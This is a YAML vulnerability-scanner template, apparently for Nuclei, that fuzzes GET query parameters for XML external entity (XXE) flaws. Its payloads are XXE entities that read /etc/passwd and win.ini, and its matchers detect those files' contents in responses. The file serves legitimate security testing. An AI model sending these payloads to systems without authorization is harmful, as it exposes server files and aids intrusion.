http:
- fuzzing:
  - fuzz:
    - '{{xxe}}'
    keys-regex:
    - (.*?)xml(.*?)
    part: query
  - fuzz:
    - '{{xxe}}'
    part: query
    values:
    - (<!DOCTYPE|<?xml|%3C!DOCTYPE|%3C%3Fxml)(.*?)>
  matchers:
  - name: linux
    part: body
    regex:
    - 'root:.*?:[0-9]*:[0-9]*:'
    type: regex
  - name: windows
    part: body
    type: word
    words:
    - for 16-bit app support
  matchers-condition: or
  payloads:
    xxe:
    - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:///c:/windows/win.ini">
      ]><x>&{{rletter}};</x>
    - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:////etc/passwd"> ]><x>&{{rletter}};</x>
  pre-condition:
  - dsl:
    - method == "GET"
    type: dsl
  stop-at-first-match: true
id: generic-xxe
info:
  author: pwnhxl
  name: Generic XML external entity (XXE)
  reference:
  - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
  severity: medium
  tags: dast,xxe
variables:
  rletter: '{{rand_base(6,''abc'')}}'
